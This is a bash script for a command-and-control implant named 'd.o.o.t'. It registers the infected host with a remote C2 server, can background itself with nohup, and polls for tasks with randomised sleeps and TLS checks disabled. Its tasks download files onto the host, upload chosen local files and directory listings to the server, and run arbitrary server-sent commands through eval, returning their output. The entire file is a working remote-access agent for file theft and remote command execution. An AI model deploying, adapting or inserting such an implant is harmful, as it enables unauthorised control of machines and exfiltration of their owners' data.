#!/usr/bin/env bash
set -euo pipefail

if [ $# -lt 1 ]; then
  echo "usage: $0 <c2_url> [--detached]"
  echo "  example: $0 https://10.0.0.5:8443 --detached"
  exit 1
fi

C2_URL="${1%/}"
DETACHED="${2:-}"

if [ "$DETACHED" = "--detached" ]; then
  echo "Launching d.o.o.t agent in detached mode..."
  nohup "$0" "$C2_URL" >/dev/null 2>&1 &
  exit 0
fi

HOST_ID="$(hostname)-$(date +%s)"
OS_NAME="linux"

pick_http_client() {
  if command -v curl >/dev/null 2>&1; then
    echo "curl"
    return
  fi
  if command -v wget >/dev/null 2>&1; then
    echo "wget"
    return
  fi
  echo ""
}

HTTP_CLIENT="$(pick_http_client)"
if [ -z "$HTTP_CLIENT" ]; then
  echo "No supported HTTP client found (curl/wget)."
  exit 1
fi

http_get() {
  local url="$1"
  if [ "$HTTP_CLIENT" = "curl" ]; then
    curl -k -fsSL "$url"
  else
    wget --no-check-certificate -qO- "$url"
  fi
}

http_download() {
  local url="$1"
  local dst="$2"
  if [ "$HTTP_CLIENT" = "curl" ]; then
    curl -k -fsSL "$url" -o "$dst"
  else
    wget --no-check-certificate -qO "$dst" "$url"
  fi
}

http_upload() {
  local url="$1"
  local src="$2"
  if [ "$HTTP_CLIENT" = "curl" ]; then
    curl -k -fsS -X POST --data-binary "@$src" "$url" >/dev/null
  else
    wget --no-check-certificate -qO- --method=POST --body-file="$src" "$url" >/dev/null
  fi
}

CHANNEL="HTTP_POLL"
if [[ "$C2_URL" == https://* ]]; then
  CHANNEL="HTTPS_POLL"
fi

if ! http_get "$C2_URL/api/ping" >/dev/null 2>&1; then
  echo "Unable to reach $C2_URL/api/ping"
  exit 1
fi

http_get "$C2_URL/api/register?id=$HOST_ID&os=$OS_NAME&channel=$CHANNEL" >/dev/null

decode_b64() {
  printf '%s' "$1" | base64 --decode 2>/dev/null || printf '%s' "$1" | base64 -d
}

echo "d.o.o.t target agent online: id=$HOST_ID channel=$CHANNEL"
while true; do
  TASK="$(http_get "$C2_URL/api/task/$HOST_ID" || echo IDLE)"

  if [[ "$TASK" == IDLE* ]]; then
    sleep $((1 + RANDOM % 10))
    continue
  fi

  ACTION="$(printf '%s' "$TASK" | awk '{print $1}')"
  TOKEN="$(printf '%s' "$TASK" | awk '{print $2}')"
  P3="$(printf '%s' "$TASK" | awk '{print $3}')"
  REMOTE_PATH="$(decode_b64 "$P3")"

  if [ "$ACTION" = "PUSH" ]; then
    mkdir -p "$(dirname "$REMOTE_PATH")" || true
    if http_download "$C2_URL/api/download/$HOST_ID/$TOKEN" "$REMOTE_PATH"; then
      echo "received $REMOTE_PATH"
    else
      echo "PUSH failed $REMOTE_PATH"
    fi
  elif [ "$ACTION" = "PULL" ]; then
    if [ -f "$REMOTE_PATH" ]; then
      if http_upload "$C2_URL/api/upload/$HOST_ID/$TOKEN" "$REMOTE_PATH"; then
        echo "sent $REMOTE_PATH"
      else
        echo "PULL upload failed $REMOTE_PATH"
      fi
    else
      echo "missing file: $REMOTE_PATH"
    fi
  elif [ "$ACTION" = "LS" ]; then
    TMP_LS="/tmp/doot_ls_$TOKEN.txt"
    ls -la "$REMOTE_PATH" > "$TMP_LS" 2>&1
    if http_upload "$C2_URL/api/upload/$HOST_ID/$TOKEN" "$TMP_LS"; then
      echo "sent LS output"
    else
      echo "LS upload failed"
    fi
    rm -f "$TMP_LS"
  elif [ "$ACTION" = "CMD" ]; then
    TMP_CMD="/tmp/doot_cmd_$TOKEN.txt"
    eval "$REMOTE_PATH" > "$TMP_CMD" 2>&1 || true
    if [ ! -s "$TMP_CMD" ]; then
      echo "Command executed, no output received" > "$TMP_CMD"
    fi
    if http_upload "$C2_URL/api/upload/$HOST_ID/$TOKEN" "$TMP_CMD"; then
      echo "sent CMD output"
    else
      echo "CMD upload failed"
    fi
    rm -f "$TMP_CMD"
  fi

  sleep $((1 + RANDOM % 10))
done
